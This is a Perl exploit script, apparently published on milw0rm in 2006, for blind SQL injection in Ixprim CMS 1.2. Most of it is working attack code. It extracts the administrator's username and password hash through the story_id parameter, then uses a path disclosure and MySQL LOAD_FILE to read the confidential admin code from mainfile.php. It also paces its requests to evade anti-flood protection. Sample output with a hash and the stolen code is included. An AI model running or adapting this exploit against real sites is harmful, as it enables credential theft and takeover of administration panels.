<html><head><title>Ixprim CMS 1.2 Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# INFORMATIONS
# ============
# Affected.scr..: Ixprim 1.2
# Poc.ID........: 16061221
# Type..........: Blind SQL Injection
# Risk.level....: Medium
# Conditions....: load_file privilege (ixp code only)
# Src.download..: www.ixprim-cms.org
# Poc.link......: acid-root.new.fr/poc/16061221.txt
# Credits.......: DarkFig
#
#
# SCREENSHOT
# ==========
# header&gt; Ixprim 1.2 Remote Blind SQL Injection Exploit
# header&gt; =============================================
# status&gt; Searching if someone posted a comment
# sploit&gt; story_id=2
# status&gt; Searching the administrator's uid
# sploit&gt; 1
# status&gt; Searching the administrator's username length
# sploit&gt; 4
# status&gt; Searching the administrator's username
# sploit&gt; root
# status&gt; Searching the adminitrator's password hash
# sploit&gt; 7b24afc8bc80e548d66c4e7ff72171c5
# status&gt; Searching a full path disclosure
# sploit&gt; /home/www/ixprim-1.2/html/mainfile.php
# status&gt; Searching the confidential ixp code
# sploit&gt; c998aa6188034690aab6565c0099fe0a
#
use HTTP::Request::Common;
use LWP::UserAgent;
use HTTP::Response;
use Getopt::Long;

print STDOUT &quot;\n header&gt; Ixprim 1.2 Remote Blind SQL Injection Exploit&quot;;
print STDOUT &quot;\n header&gt; =============================================\n&quot;;

my $opt = GetOptions(
   'host=s'  =&gt; \$host,
   'path=s'  =&gt; \$path,
   'proxh=s' =&gt; \$proxh,
   'proxu=s' =&gt; \$proxu,
   'proxp=s' =&gt; \$proxp);

if(!$host) {
    print STDOUT &quot; header&gt; Usage..: xpl.pl -host [host] -path [path]\n&quot;;
    print STDOUT &quot; header&gt; Options: -proxh [host] -proxu [user] -proxp [pass]\n&quot;;
    exit(1);
}

$host = $host !~ /^http:\/\// ? &quot;http://$host&quot; : $host;
$path = defined($path) ? $path : &quot;/&quot;;

my $ua = LWP::UserAgent-&gt;new();
   $ua-&gt;agent('r00xzilla');
   $ua-&gt;timeout(30);
   $ua-&gt;proxy('[http]' =&gt; $proxh) if $proxh;

my $req = HTTP::Request-&gt;new(GET =&gt; $host.$path.'ixm_ixpnews.php');
   $req-&gt;proxy_authorization_basic($proxu,$proxp) if $proxu;
   $res = ($ua-&gt;request($req))-&gt;content;
   print STDOUT &quot; status&gt; Searching if someone posted a comment\n&quot;;

   # There is more than one sql injection, but this one is the most
   # interesting to exploit. The parameter 'story_id' isn't properly
   # sanitised before being used in an SQL query. URL Rewriting option
   # supported.
   #
   if($res =~ /(story_id=||news-art)([0-9]+)(||.html)&quot;&gt;([0-9]+) (commentaire||comment)/) {
   $story_id = $2;
   $bsql = $host.$path.&quot;ixm_ixpnews.php?file=article&amp;story_id=$story_id&quot;;
   print STDOUT &quot; sploit&gt; story_id=$story_id\n&quot;;} else {
   print STDOUT &quot; status&gt; No comment posted\n\n&quot;;
   exit(1);
   }
   
   print STDOUT &quot; status&gt; Searching the administrator's uid\n&quot;;
   $uid = sendreq(1,1,&quot;select%20uid%20from%20ixp_users%20order%20by%20uid%20limit%200,1&quot;);
   
   print STDOUT &quot; status&gt; Searching the administrator's username length\n&quot;;
   $admlg = sendreq(1,3,&quot;length((select%20uname%20from%20ixp_users%20where%20uid=$uid))&quot;);

   print STDOUT &quot; status&gt; Searching the administrator's username\n&quot;;
   &amp;sendreq(1,$admlg,&quot;select%20uname%20from%20ixp_users%20where%20uid=$uid&quot;);
   
   print STDOUT &quot; status&gt; Searching the adminitrator's password hash\n&quot;;
   &amp;sendreq(1,32,&quot;select%20pass%20from%20ixp_users%20where%20uid=$uid&quot;);
   
   print STDOUT &quot; status&gt; Searching a full path disclosure&quot;;
   $req = GET $host.$path.'kernel/plugins/fckeditor2/ixprim_api.php';
   $res = ($ua-&gt;request($req))-&gt;content;
   if($res =~ /in &lt;b&gt;(.*?)kernel(\/||\\)/) {
   $fpd = $1.'mainfile.php';
   print STDOUT &quot;\n sploit&gt; $fpd\n&quot;;} else {
   print STDOUT &quot;\n status&gt; Can't get the full path disclosure&quot;;
   exit(1);
   }

   # A personal code who is stored in mainfile.php protect the administration panel
   #
   # // Code personnel CMS
   #	define(&quot;IXP_CODE&quot;, 'c998aa6188034690aab6565c0099fe0a');
   #
   # This code is generated by the function code() stored in install.fct.php
   #
   # function code($param='1')
   # {
   # 	$number = rand(1,1024);
   # 	$temp = md5(($number*time()).$param);
   # 	$temp = substr($temp, 0, 8);
   # 	return $temp;
   # }
   #
   # $param = $host.$path and $temp can be modified by the user.
   # After the request sent, the script create the sql tables and the time()
   # when it created them is stored in the mysql database, we can retrieve it with the sql
   # injection and IF the user don't modified the generated code, we can find the personal code.
   # The time during the creation of the table and the generation of the code
   # is not the same, but we can try to bruteforce it with some parameters.
   # But the user can change the generated code ... that's why i decided to use the sql
   # injection with load_file and regexp.
   #
   print STDOUT &quot; status&gt; Searching the confidential ixp code\n&quot;;
   
   # Example with &quot;C:/Program Files/EasyPHP1-8/www/ixprim-1.2/html/mainfile.php&quot;
   #
   # magic_quotes_gpc=off
   # ====================
   # [SQL] and LOAD_FILE(&quot;C:/Program Files/EasyPHP1-8/www/ixprim-1.2/html/mainfile.php&quot;)
   # REGEXP(&quot;define(\&quot;IXP_CODE\&quot;, '[PART_OF_IXP_CODE]&quot;);
   #
   # magic_quotes_gpc=on
   # ===================
   # [SQL] and LOAD_FILE(concat(char(67),char(58),char(47),char(80),char(114),char(111),char(103),char(114),
   # char(97),char(109),char(32),char(70),char(105),char(108),char(101),char(115),char(47),char(69),
   # char(97),char(115),char(121),char(80),char(72),char(80),char(49),char(45),char(56),char(47),char(119),
   # char(119),char(119),char(47),char(105),char(120),char(112),char(114),char(105),char(109),char(45),
   # char(49),char(46),char(50),char(47),char(104),char(116),char(109),char(108),char(47),char(109),char(97),
   # char(105),char(110),char(102),char(105),char(108),char(101),char(46),char(112),char(104),char(112)))
   # REGEXP(concat(char(73),char(88),char(80),char(95),char(67),char(79),char(68),char(69),char(34),char(44),
   # char(32),char(39),char([PART_OF_IXP_CODE])))
   #
   &amp;sendreq(1,32,&quot;load_file(concat(&quot;.concatchar($fpd).&quot;)) REGEXP(concat(&quot;.concatchar(&quot;IXP_CODE\&quot;, '&quot;));
   exit(1);

   # Determine if the sql request return true or false.
   # Modify the username's charset if it contain special char.
   # sleep(2) needed for bypass the antiflood protection.
   # If the username's length &gt; 19 the exploit doesn't works.
   #
sub sendreq() {
 
   my($start,$limit,$sql) = ($_[0],$_[1],$_[2]);
   my($gchar,$char) = '';

   @charset=(0...9) if $sql =~ /^(length|select%20uid)/;
   @charset=(a...z,0...9) if $sql =~ /^select%20uname/;
   @charset=(a...f,0...9) if $sql =~ /^(select%20pass|load_file)/;

   for($y=$start;$y&lt;=$limit;$y++) {
   foreach $char (@charset) {
   print STDERR &quot;\r sploit&gt; $gchar$char&quot;;
   if($sql !~ /load_file/) {
   $req = GET $bsql.&quot;%20and%20substr((&quot;.$sql.&quot;),$y,1)=&quot;.concatchar($char);}
   else {
   $req = GET $bsql.&quot;%20and%20&quot;.$sql.&quot;,&quot;.concatchar($gchar.$char).&quot;))&quot;;}
   sleep(2);
   
   $res = ($ua-&gt;request($req))-&gt;content;
   if($res =~ /&lt;br \/&gt; &lt;div id=&quot;comments&quot;&gt;/) {
   $gchar .= $char;
   last;}}
   
   if(($sql =~ /length/) and ($gchar.$char =~ /^([0-9]+)9$/)){
   last;}}
   
   print STDERR &quot;\n&quot;;
 return $gchar.$char;
}

sub concatchar() {

   my $string = shift;
   my $temp = '';
   
   for($i=0;$i&lt;length($string);$i++) {
   $temp .= &quot;char(&quot;.ord(substr($string,$i,1)).&quot;)&quot;;
   $temp .= ',' if $i != (length($string)-1);
   }
   
 return $temp;
}

# milw0rm.com [2006-12-21]</pre></html>